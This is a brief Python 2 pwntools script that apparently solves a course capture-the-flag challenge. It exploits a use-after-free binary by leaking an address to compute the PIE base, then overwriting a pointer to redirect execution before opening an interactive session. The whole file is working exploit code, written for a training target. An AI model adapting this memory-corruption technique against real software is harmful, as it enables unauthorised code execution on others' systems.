# python2
from pwn import *

r = remote('edu-ctf.csie.org', 10177)
# r = process('./uaf')
r.sendafter('Size of your messege: ', str(0x10))
r.sendafter('Messege: ', 'a' * 8)

r.recvuntil('a' * 8) # information leak back

pie_base = u64(r.recv(6) + '\0\0') - 0xa77 # unpack 64 bits for leaked fata
success('PIE is %s' % (hex(pie_base))) #data logging

r.sendafter('Size of your messege: ', str(0x10))
r.sendafter('Messege: ', 'a' * 8 + p64(pie_base + 0xab5))

r.interactive()
